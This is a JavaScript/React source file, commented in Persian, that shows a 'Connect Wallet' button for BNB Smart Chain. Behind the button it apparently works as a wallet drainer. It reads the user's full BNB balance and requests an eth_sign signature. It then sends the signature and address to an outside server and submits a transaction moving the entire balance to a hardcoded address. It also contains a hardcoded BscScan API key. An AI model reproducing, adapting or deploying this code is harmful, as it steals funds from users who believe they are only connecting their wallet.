import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";

// تابع گرفتن بالانس BNB از BscScan (بدون تغییر)
async function getBNBBalance(address) {
  try {
    const response = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await response.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  async function runner() {
    // پاک کردن session قدیمی (WalletConnect)
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    // راه‌اندازی WalletConnect Provider
    const ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56],
      methods: ["eth_sign", "eth_sendTransaction"], 
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    // فعال‌کردن اتصال (QR Code را به کاربر نشان می‌دهد)
    await ethereumProvider.enable();
    const provider = ethereumProvider;

    // گرفتن آدرس متصل‌شده
    const accounts = await provider.request({ method: "eth_accounts" });
    const accountSender = accounts[0];

    if (!accountSender) {
      console.error("❌ Wallet connection failed");
      return;
    }

    console.log("✅ Wallet Connected:", accountSender);

    // اطمینان از اینکه روی شبکه بایننس اسمارت چین هستیم
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // chainId اصلی BSC
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    // آدرس سرور PHP که امضا را بررسی می‌کند
    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    // 1) گرفتن بالانس BNB از BscScan
    const amount = await getBNBBalance(accountSender);
    if (!amount) {
      console.error("❌ Failed to fetch BNB balance.");
      return;
    }
    console.log("💰 BNB Balance:", amount);

    // 2) ساخت پیام برای امضای اول
    const message = `Authorize sending ${amount} BNB from ${accountSender}`;
    console.log("📜 Message to Sign:", message);

    // 3) امضای پیام اول با eth_sign (تأیید شفاهی کاربر)
    let signature;
    try {
      signature = await provider.request({
        method: "eth_sign",
        params: [accountSender, message],
      });
    } catch (error) {
      console.error("❌ Signature failed:", error);
      return;
    }
    console.log("✍️ Signature:", signature);

    // 4) ارسال امضا به سرور با handler='tx' تا فقط امضا را تأیید کند (اختیاری)
    let verifyResult;
    try {
      verifyResult = await jQuery.post(apiUrl, {
        handler: "tx",          // سرور تشخیص می‌دهد امضای پیام ساده است
        address: accountSender,
        signature: signature,  
        amount: amount,         
      });

      console.log("📥 Server Response:", verifyResult);

      // درصورت نیاز، بررسی کنید که verifyResult.success === true
      if (typeof verifyResult === "string") {
        verifyResult = JSON.parse(verifyResult);
      }
      if (!verifyResult || !verifyResult.success) {
        console.error("❌ Signature verification failed or server error.");
        return;
      }
    } catch (err) {
      console.error("❌ Could not verify signature on server:", err);
      return;
    }

    // 5) حالا تراکنش واقعی را از کیف پول کاربر بفرستیم (خودش گس را می‌دهد)
    try {
      // مقدار BNB را از عدد اعشاری به Wei تبدیل کنیم
      const valueWeiHex = "0x" + (parseFloat(amount) * 1e18).toString(16);

      // ساخت و ارسال تراکنش با eth_sendTransaction
      console.log("🚀 Sending real transaction from user wallet...");
      const txHash = await provider.request({
        method: "eth_sendTransaction",
        params: [{
          from: accountSender,
          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
          value: valueWeiHex,
        }],
      });

      console.log("📤 Transaction Hash:", txHash);
      alert("Transaction broadcasted! Hash: " + txHash);
    } catch (error) {
      console.error("❌ Error in eth_sendTransaction:", error);
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
